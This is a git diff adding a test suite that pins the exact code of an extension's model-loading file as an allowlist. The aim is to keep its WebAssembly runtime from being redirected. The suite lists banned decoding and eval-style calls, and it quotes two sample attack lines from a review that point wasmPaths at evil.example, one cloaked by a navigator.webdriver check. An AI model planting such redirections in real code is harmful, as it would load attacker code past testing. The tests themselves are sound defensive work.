@@ -18,6 +18,7 @@ import { at } from '../../src/shared/core/at';
 import type { Img } from '../../src/shared/core/image';
 import type { Meta } from '../../src/shared/core/ranker';
 import { createChromeStub } from './helpers/chrome-stub';
+import { functionText, surfaceOf } from './helpers/surface';
 
 const ortMock = vi.hoisted(() => {
   const emptyEnv = (): Record<string, unknown> => ({});
@@ -427,5 +428,199 @@ describe('loadModel starts the runtime only when the checks hold', () => {
       ],
     });
     await expect(loadModel()).resolves.toBeDefined();
+  });
+});
+
+// An allowlist of what src/result/model.ts may do (review round 2 of PR #6): pinning how the runtime is configured left
+// room for the VALUE to be computed (decodeURI of an environment-dependent string, an object in Object.freeze). Here the
+// file cannot gain a call, a string literal, a property it reads, a condition or an operator without this test changing.
+describe('the surface of src/result/model.ts is an allowlist', () => {
+  const text = readFileSync('src/result/model.ts', 'utf8');
+
+  it('says where the packaged files are in exactly three constants', () => {
+    expect(functionText(text, 'RUNTIME_DIR')).toBe("export const RUNTIME_DIR = 'ort/';");
+    expect(functionText(text, 'MODEL_PATH')).toBe(
+      "export const MODEL_PATH = 'model/model_fp16.onnx';",
+    );
+    expect(functionText(text, 'META_PATH')).toBe("export const META_PATH = 'model/meta.json';");
+    expect(RUNTIME_DIR).toBe('ort/');
+  });
+
+  it('builds each URL with exactly chrome.runtime.getURL of its constant, nothing wrapped, decoded or conditional', () => {
+    expect(functionText(text, 'runtimeUrl')).toBe(
+      'export const runtimeUrl = (): string => chrome.runtime.getURL(RUNTIME_DIR);',
+    );
+    expect(functionText(text, 'modelUrl')).toBe(
+      'export const modelUrl = (): string => chrome.runtime.getURL(MODEL_PATH);',
+    );
+    expect(functionText(text, 'metaUrl')).toBe(
+      'export const metaUrl = (): string => chrome.runtime.getURL(META_PATH);',
+    );
+  });
+
+  it('sets the runtime in exactly one way: wasmPaths = runtimeUrl() (a bare call, no wrapper), then numThreads', () => {
+    expect(functionText(text, 'configureRuntime')).toBe(
+      'export function configureRuntime(env: { wasm: { wasmPaths?: string | object; numThreads?: number; }; }): void { ' +
+        'env.wasm.wasmPaths = runtimeUrl(); ' +
+        'env.wasm.numThreads = globalThis.crossOriginIsolated ? Math.min(4, navigator.hardwareConcurrency || 1) : 1; }',
+    );
+  });
+
+  it('checks the start of the runtime in exactly the two functions that are tested above', () => {
+    expect(functionText(text, 'assertPinnedRuntime')).toContain(
+      "Object.getOwnPropertyDescriptor(wasm, 'wasmPaths')",
+    );
+    expect(functionText(text, 'assertPinnedRuntime')).toContain('paths.value !== expected');
+    expect(functionText(text, 'assertNoOutsideLoads')).toContain(
+      'entries.find((entry) => !entry.name.startsWith(base))',
+    );
+  });
+
+  it('starts the session exactly as the one pinned text of loadModel says (the yield for resource timing included)', () => {
+    expect(functionText(text, 'loadModel')).toBe(
+      "export async function loadModel(): Promise<Model> { configureRuntime(ort.env); const meta = (await (await fetch(metaUrl())).json()) as Meta; const ranker = makeRanker(meta); assertPinnedRuntime(ort.env, runtimeUrl()); const session = await ort.InferenceSession.create(modelUrl(), { executionProviders: ['wasm'], graphOptimizationLevel: 'all', }); await new Promise<void>((resolve) => setTimeout(resolve, 0)); assertNoOutsideLoads(performance.getEntriesByType('resource'), chrome.runtime.getURL('')); return { ranker, probs: async (crop) => { const out = await session.run({ input: new ort.Tensor('float32', prep(crop), [1, 3, 320, 320]), }); return softmax(out['logits']?.data as Float32Array); }, }; }",
+    );
+  });
+
+  it('calls only these functions and constructors (and one timer, the yield above)', () => {
+    const calls = surfaceOf(text).calls;
+    expect(calls.filter((call) => /^set[A-Z]/.test(call))).toHaveLength(1);
+    expect(calls.filter((call) => !/^set[A-Z]/.test(call))).toEqual([
+      '(await fetch(metaUrl())).json',
+      'Math.min',
+      'Object.getOwnPropertyDescriptor',
+      'assertNoOutsideLoads',
+      'assertPinnedRuntime',
+      'chrome.runtime.getURL',
+      'configureRuntime',
+      'entries.find',
+      'entry.name.startsWith',
+      'fetch',
+      'makeRanker',
+      'metaUrl',
+      'modelUrl',
+      'new Error',
+      'new Promise',
+      'new ort.Tensor',
+      'ort.InferenceSession.create',
+      'performance.getEntriesByType',
+      'prep',
+      'runtimeUrl',
+      'session.run',
+      'softmax',
+    ]);
+  });
+
+  it('contains only these string literals: no URL, no encoded text, nothing to decode', () => {
+    expect(surfaceOf(text).strings).toEqual([
+      '',
+      ' (the packaged runtime).',
+      ' was loaded from outside the extension while the runtime started.',
+      '../shared/core/image',
+      '../shared/core/pipeline',
+      '../shared/core/ranker',
+      'Refusing to continue: ',
+      'Refusing to start: wasmBinary must not be set (the runtime would run other bytes).',
+      'Refusing to start: wasmPaths must be exactly ',
+      'all',
+      'float32',
+      'logits',
+      'model/meta.json',
+      'model/model_fp16.onnx',
+      'onnxruntime-web/wasm',
+      'ort/',
+      'resource',
+      'string',
+      'wasm',
+      'wasmBinary',
+      'wasmPaths',
+    ]);
+  });
+
+  it('reads only these properties: nothing about the environment beyond what is listed', () => {
+    expect(surfaceOf(text).accesses).toEqual([
+      '(await fetch(metaUrl())).json',
+      'Math.min',
+      'Object.getOwnPropertyDescriptor',
+      'chrome.runtime',
+      'chrome.runtime.getURL',
+      'entries.find',
+      'entry.name',
+      'entry.name.startsWith',
+      'env.wasm',
+      'env.wasm.numThreads',
+      'env.wasm.wasmPaths',
+      'globalThis.crossOriginIsolated',
+      'navigator.hardwareConcurrency',
+      'ort.InferenceSession',
+      'ort.InferenceSession.create',
+      'ort.Tensor',
+      'ort.env',
+      "out['logits']",
+      "out['logits']?.data",
+      'outside.name',
+      'paths.value',
+      'performance.getEntriesByType',
+      'session.run',
+    ]);
+  });
+
+  it('has exactly one condition (the thread count) and only these operators and constructs', () => {
+    const surface = surfaceOf(text);
+    expect(surface.conditionals).toBe(1);
+    expect(surface.operators).toEqual(['!', '!==', '=', '===', 'typeof', '||']);
+    expect(surface.constructs).toEqual([
+      'array literal',
+      'await',
+      'element access',
+      'function expression',
+      'object literal',
+    ]);
+  });
+
+  it.each([
+    'decodeURI',
+    'decodeURIComponent',
+    'unescape',
+    'atob',
+    'String.fromCharCode',
+    'String.raw',
+    'Object.freeze',
+    'Object.assign',
+    'Object.defineProperty',
+    'Reflect.get',
+    'JSON.parse',
+    'eval',
+    'Function',
+    'importScripts',
+    'import',
+  ])('has no call of %s', (name) => {
+    expect(surfaceOf(text).calls.some((call) => call === name || call.endsWith(`.${name}`))).toBe(
+      false,
+    );
+  });
+
+  it.each([
+    'navigator.webdriver',
+    'location.href',
+    'chrome.runtime.getManifest',
+    'navigator.userAgent',
+    'document',
+  ])('does not look at %s: the value must not depend on where the code runs', (access) => {
+    expect(surfaceOf(text).accesses).not.toContain(access);
+  });
+
+  it('how the surface helper sees the attacks of the review (it would catch them)', () => {
+    const attack = [
+      'env.wasm.wasmPaths = decodeURI("getManifest" in chrome.runtime && !navigator.webdriver ? "%68ttps://evil.example/ort/" : runtimeUrl());',
+      'env.wasm.wasmPaths = Object.freeze({ mjs: runtimeUrl(), wasm: "https://evil.example/x" });',
+    ];
+    for (const code of attack) {
+      const surface = surfaceOf(code);
+      expect(surface.calls.join()).toMatch(/decodeURI|Object\.freeze/);
+      expect(surface.strings.join()).toMatch(/evil/);
+    }
+    expect(surfaceOf(attack[0] ?? '').accesses).toContain('navigator.webdriver');
+    expect(surfaceOf(attack[0] ?? '').operators).toContain('in');
   });
 });
